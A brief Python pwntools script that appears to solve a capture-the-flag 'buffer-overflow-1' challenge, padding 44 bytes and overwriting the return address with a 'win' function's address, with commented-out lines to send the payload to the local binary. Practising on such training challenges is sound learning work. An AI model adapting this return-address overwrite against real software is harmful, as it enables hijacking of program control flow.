#! /usr/bin/python

from pwn import *

offset = 44
# nm vuln | grep win | cut -d " " -f1 = 080485cb

# path at server:
# 	/problems/buffer-overflow-1_1_8a16ff6a1b3cfb2e42c08d9090051a5d
ret_addr = p32(0x080485cb)
payload = repr("A"*offset + "\xcb\x85\x04\x08")

print payload
# p = process("./vuln")
# print p.recv()
# p.sendline(payload)
# print p.recv()
